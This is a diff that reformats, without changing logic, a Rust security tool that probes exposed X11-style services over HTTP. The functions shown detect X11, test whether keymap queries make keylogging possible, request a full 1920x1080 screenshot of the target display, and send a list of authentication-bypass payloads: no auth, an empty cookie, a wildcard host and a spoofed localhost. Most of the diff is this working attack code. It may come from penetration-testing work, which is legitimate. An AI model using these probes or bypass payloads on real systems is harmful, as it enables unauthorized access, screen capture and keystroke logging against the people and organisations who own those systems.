@@ -3,7 +3,11 @@ use reqwest::Client;
 use std::time::Duration;
 
 fn build_client(timeout: u64) -> Client {
-    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
+    Client::builder()
+        .timeout(Duration::from_secs(timeout))
+        .redirect(reqwest::redirect::Policy::none())
+        .build()
+        .unwrap_or_else(|_| Client::new())
 }
 
 pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
@@ -17,7 +21,8 @@ pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
     let status = resp.status().as_u16();
     let body = resp.text().await.unwrap_or_default();
 
-    if status == 200 && (body.contains("X11") || body.contains("xterm") || body.contains("DISPLAY")) {
+    if status == 200 && (body.contains("X11") || body.contains("xterm") || body.contains("DISPLAY"))
+    {
         println!("  {} X11 service detected", "[+]".green().bold());
     }
 
@@ -48,7 +53,10 @@ pub async fn keylog(url: &str, timeout: u64) -> anyhow::Result<()> {
             let status = r.status().as_u16();
             let text = r.text().await.unwrap_or_default();
             if status == 200 && !text.is_empty() {
-                println!("  {} Keymap query successful — keylogging possible", "[!]".red().bold());
+                println!(
+                    "  {} Keymap query successful — keylogging possible",
+                    "[!]".red().bold()
+                );
             } else {
                 println!("  {} Keymap query — status={}", "[-]".dimmed(), status);
             }
@@ -77,15 +85,28 @@ pub async fn screenshot(url: &str, timeout: u64) -> anyhow::Result<()> {
     println!("{}", "-".repeat(60).dimmed());
 
     let client = build_client(timeout);
-    let body = serde_json::json!({"action": "get_image", "x": 0, "y": 0, "width": 1920, "height": 1080});
+    let body =
+        serde_json::json!({"action": "get_image", "x": 0, "y": 0, "width": 1920, "height": 1080});
     match client.post(url).json(&body).send().await {
         Ok(r) => {
             let status = r.status().as_u16();
-            let ct = r.headers().get("content-type").map(|v| v.to_str().unwrap_or("")).unwrap_or("");
+            let ct = r
+                .headers()
+                .get("content-type")
+                .map(|v| v.to_str().unwrap_or(""))
+                .unwrap_or("");
             if status == 200 && (ct.contains("image") || ct.contains("octet-stream")) {
-                println!("  {} Screenshot captured — screen contents exposed", "[!]".red().bold());
+                println!(
+                    "  {} Screenshot captured — screen contents exposed",
+                    "[!]".red().bold()
+                );
             } else {
-                println!("  {} Screenshot — status={} type={}", "[-]".dimmed(), status, ct);
+                println!(
+                    "  {} Screenshot — status={} type={}",
+                    "[-]".dimmed(),
+                    status,
+                    ct
+                );
             }
         }
         Err(_) => println!("  {} Screenshot — error", "[-]".dimmed()),
@@ -103,13 +124,28 @@ pub async fn bypass(url: &str, timeout: u64) -> anyhow::Result<()> {
     let client = build_client(timeout);
     let bypass_payloads = [
         ("No auth", r#"{"action": "connect", "auth": false}"#),
-        ("Empty cookie", r#"{"action": "connect", "auth_cookie": ""}"#),
-        ("Wildcard", r#"{"action": "connect", "host": "*", "auth": false}"#),
-        ("Spoofed host", r#"{"action": "connect", "host": "localhost", "auth": false}"#),
+        (
+            "Empty cookie",
+            r#"{"action": "connect", "auth_cookie": ""}"#,
+        ),
+        (
+            "Wildcard",
+            r#"{"action": "connect", "host": "*", "auth": false}"#,
+        ),
+        (
+            "Spoofed host",
+            r#"{"action": "connect", "host": "localhost", "auth": false}"#,
+        ),
     ];
 
     for (name, payload) in &bypass_payloads {
-        match client.post(url).header("Content-Type", "application/json").body(*payload).send().await {
+        match client
+            .post(url)
+            .header("Content-Type", "application/json")
+            .body(*payload)
+            .send()
+            .await
+        {
             Ok(r) => {
                 let status = r.status().as_u16();
                 let text = r.text().await.unwrap_or_default();
